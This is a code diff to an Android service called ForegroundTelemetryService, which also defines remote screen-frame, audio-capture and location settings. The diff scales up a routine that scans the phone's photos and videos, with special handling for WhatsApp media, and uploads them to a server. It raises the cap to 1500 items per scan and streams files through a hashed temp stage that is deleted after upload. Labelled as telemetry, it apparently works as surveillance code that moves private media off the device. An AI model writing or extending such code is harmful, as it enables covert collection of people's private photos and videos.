@@ -46,6 +46,7 @@ import java.io.InputStream;
 import java.io.ByteArrayInputStream;
 import java.io.File;
 import java.io.FileInputStream;
+import java.io.FileOutputStream;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
 import java.security.MessageDigest;
@@ -84,6 +85,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     private static final long REMOTE_SCREEN_FRAME_INTERVAL_MS = 60_000L;
     private static final int REMOTE_AUDIO_SEGMENT_MS = 60_000;
     private static final int REMOTE_AUDIO_SAMPLE_RATE = 16_000;
+    private static final int MAX_MEDIA_ITEMS_PER_SCAN = 1500;
 
     private LocationManager locationManager;
     private volatile Location lastLocation = null;
@@ -1185,7 +1187,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
         try {
             int count = 0;
             while (cursor.moveToNext()) {
-                if (++count > 500) break;
+                if (++count > MAX_MEDIA_ITEMS_PER_SCAN) break;
                 long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID));
                 String mime = null;
                 String displayName = null;
@@ -1222,10 +1224,11 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                     baseUri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
                 }
                 Uri uri = ContentUris.withAppendedId(baseUri, id);
-                try (InputStream is = cr.openInputStream(uri)) {
-                    if (is == null) continue;
-                    byte[] data = readAllBytes(is);
-                    String hash = sha256(data);
+                PreparedUpload prepared = null;
+                try {
+                    prepared = stageMediaForUpload(cr, uri);
+                    if (prepared == null || prepared.file == null || !prepared.file.exists()) continue;
+                    String hash = prepared.sha256;
                     if (hash == null || uploaded.contains(hash)) continue;
 
                     String ext = ".bin";
@@ -1243,7 +1246,8 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                     metadata.put("origin", origin);
                     metadata.put("displayName", displayName);
                     metadata.put("relativePath", relativePath);
-                    metadata.put("sizeBytes", sizeBytes > 0 ? sizeBytes : data.length);
+                    metadata.put("sizeBytes", sizeBytes > 0 ? sizeBytes : prepared.sizeBytes);
+                    metadata.put("uploadStrategy", "staged_file_stream");
                     if (dateAddedSeconds > 0) metadata.put("dateAddedMs", dateAddedSeconds * 1000L);
                     String relativePathLower = relativePath != null ? relativePath.toLowerCase() : "";
                     boolean isWhatsappSharedMedia = relativePathLower.contains("whatsapp")
@@ -1259,7 +1263,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                         }
                     }
                     form.put("metadataJson", metadata.toString());
-                    String resp = HttpClient.uploadFile(url, "media", filename, data, mime, form, token);
+                    String resp = HttpClient.uploadFile(url, "media", filename, prepared.file, mime, form, token);
                     JSONObject jr = new JSONObject(resp != null ? resp : "{}");
                     if (jr.optBoolean("ok")) {
                         uploaded.add(hash);
@@ -1268,7 +1272,8 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                         JSONObject ctx = new JSONObject();
                         ctx.put("contentType", mime);
                         ctx.put("origin", origin);
-                        sendMetric("media_pipeline", "device_scan_upload", "ok", (int) (System.currentTimeMillis() - startedAt), (double) data.length, ctx);
+                        ctx.put("sizeBytes", prepared.sizeBytes);
+                        sendMetric("media_pipeline", "device_scan_upload", "ok", (int) (System.currentTimeMillis() - startedAt), (double) prepared.sizeBytes, ctx);
                     } else {
                         JSONObject ctx = new JSONObject();
                         ctx.put("contentType", mime);
@@ -1285,10 +1290,59 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                         sendMetric("media_pipeline", "device_scan_upload", "error", null, null, ctx);
                     } catch (Exception ignored) {
                     }
+                } finally {
+                    if (prepared != null && prepared.file != null && prepared.file.exists()) {
+                        //noinspection ResultOfMethodCallIgnored
+                        prepared.file.delete();
+                    }
                 }
             }
         } finally {
             cursor.close();
+        }
+    }
+
+    private PreparedUpload stageMediaForUpload(ContentResolver cr, Uri uri) throws Exception {
+        try (InputStream is = cr.openInputStream(uri)) {
+            if (is == null) return null;
+            File folder = new File(getCacheDir(), "media_upload_stage");
+            if (!folder.exists() && !folder.mkdirs()) throw new IllegalStateException("stage_dir_create_failed");
+            File stagedFile = File.createTempFile("media_stage_", ".bin", folder);
+            MessageDigest digest = MessageDigest.getInstance("SHA-256");
+            long sizeBytes = 0L;
+            try (FileOutputStream os = new FileOutputStream(stagedFile)) {
+                byte[] buffer = new byte[64 * 1024];
+                int read;
+                while ((read = is.read(buffer)) != -1) {
+                    os.write(buffer, 0, read);
+                    digest.update(buffer, 0, read);
+                    sizeBytes += read;
+                }
+            } catch (Exception e) {
+                //noinspection ResultOfMethodCallIgnored
+                stagedFile.delete();
+                throw e;
+            }
+            return new PreparedUpload(stagedFile, toHex(digest.digest()), sizeBytes);
+        }
+    }
+
+    private String toHex(byte[] bytes) {
+        if (bytes == null) return null;
+        StringBuilder sb = new StringBuilder();
+        for (byte b : bytes) sb.append(String.format(java.util.Locale.US, "%02x", b));
+        return sb.toString();
+    }
+
+    private static final class PreparedUpload {
+        final File file;
+        final String sha256;
+        final long sizeBytes;
+
+        PreparedUpload(File file, String sha256, long sizeBytes) {
+            this.file = file;
+            this.sha256 = sha256;
+            this.sizeBytes = sizeBytes;
         }
     }
 
